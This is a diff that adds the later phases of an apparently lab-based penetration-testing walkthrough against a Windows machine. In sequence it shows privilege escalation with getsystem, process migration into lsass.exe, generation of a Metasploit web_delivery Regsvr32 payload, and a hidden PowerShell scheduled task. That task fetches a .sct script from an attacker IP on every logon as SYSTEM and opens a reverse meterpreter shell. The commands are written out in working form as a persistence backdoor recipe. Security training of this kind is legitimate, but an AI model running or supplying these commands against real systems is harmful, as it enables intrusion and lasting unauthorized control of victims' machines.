@@ -20,7 +20,48 @@ Now open metasploit framework (msfconsole -q) and load exploit (exploit/windows/
 exploit the target.We have successfully exploit the target and get a meterpreter shell. Now 2nd phase completed.
 
 Now i am checking the current user which i got after exploitation and got to know that i am running as administrator user so now i am going to elevate to the system priviege
-to NT authrority (getsystem).After running getsystem i have elevated my privilege and now running as NT
+to NT authrority (getsystem).After running getsystem i have elevated my privilege and now running as NT Authroity System and then
+migrate current process to lsass.exe (ps -S lsass.exe ==> migrate pid of lsass.exe) because when we exploit any system,at that
+time we are using temporary process and that process kill or terminate any time thatswhy we are migrating that process to 
+permanent running processes like explorer.exe or lsass.exe. Now 3rd phase completed.
+
+In this case i am going to configure a persistence backdoor using the exploit/multi/script/web_delivery metasploit module.
+So we will generate a Regsvr32 malicious web delivery link for the persistence access. Then we will use the generated link
+to create a taskthat will trigger the malicious link every time the user login into the system.
+
+For generating malicious link, i am going to start another metasploit framework (msfconsole -q) and use below commands:
+use exploit/multi/script/web_delivery
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST Attacker_IP
+set target 3
+exploit
+
+Once above module runs, i will get a malicious link like "regsvr32 /s /n /u /i:http://attacker_ip:8080/5oq2CIKAnPFv08.sct scrobj.dll"
+Now 4th phase completed.
+
+Now i have to create a schedule task in the compromised system so go to meterpreter shell and load powershell (load powershell) 
+and after loading run this command powershell_shell. Powershell is loaded now i am going to run schtaks to schedule a task that executes
+powershell.exe to launch a malicious link on logon with system privilege.
+
+schtasks /create /tn AttackDefense /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'regsvr32 /s /n /u
+/i:http://10.10.1.4:8080/5oq2CIKAnPFvO8.sct scrobj.dll'" /sc onlogon /ru System
+Once above command execute successfully, a new schedule task named "AttackDefense" created.Now 5th phase completed.
+
+Now if user of compromised system reboot their machine and system started, my scheduled task executed because i have added a condition
+whenever user login my task executed and a reverse shell created towards my attacker ip.
+But in my lab scenerio i have to reboot compomised machine, to do this firstly i have to back from powershell prompt so use ctrl+c
+and now i am in meterpreter shell and run "reboot". Now 6th phase completed.
+
+Once machine comes up and user login again, my schedule task runs and malicious link executed and i will get a meterpreter 
+session on my attacker machine where i executed metasploit module for generating malicious link.
+
+In this way we are maintaining access or creating persistence on compromised system. Now i am not going to exploit again and again
+if compromised system reboot or shutdown because i have created a backdoor which executes whenever user login on the system.
+
+===============================================complete============================================
+
+
+
 
 
 
